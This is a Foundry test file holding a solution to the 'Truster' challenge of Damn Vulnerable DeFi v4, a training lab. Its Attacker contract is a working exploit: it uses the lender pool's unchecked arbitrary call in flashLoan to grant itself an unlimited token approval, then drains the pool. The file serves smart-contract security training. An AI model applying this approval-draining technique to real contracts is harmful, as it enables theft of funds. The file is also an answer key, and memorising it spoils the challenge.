// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {
        // Perform the attack from a different contract to comply
        // with the nonce check in the success conditions.
        // If you execute the attack in this function, the nonce will remain 0.
        Attacker attacker = new Attacker(pool, token, player, recovery);
        attacker.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

contract Attacker {
    TrusterLenderPool internal pool;
    DamnValuableToken internal token;
    address internal player;
    address internal recovery;

    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _player, address _recovery) {
        pool = _pool;
        token = _token;
        player = _player;
        recovery = _recovery;
    }

    function attack() public {
        // The correct encoding should include the selector and arguments separately, not nested.
        // This attack is straightforward: We leverage `target.functionCall(data)` in the flashLoan function
        // to issue an ERC20 approval, allowing us to drain all the funds from the pool.
        bytes memory data = abi.encodeWithSelector(token.approve.selector, address(this), type(uint256).max);

        // The flashLoan function does not check for amount = 0, so we don't need to return any funds.
        pool.flashLoan(0, address(this), address(token), data);

        // The transferFrom function checks that msg.sender has sufficient allowance.
        // We can now transfer the funds to the recovery address.
        token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
    }
}
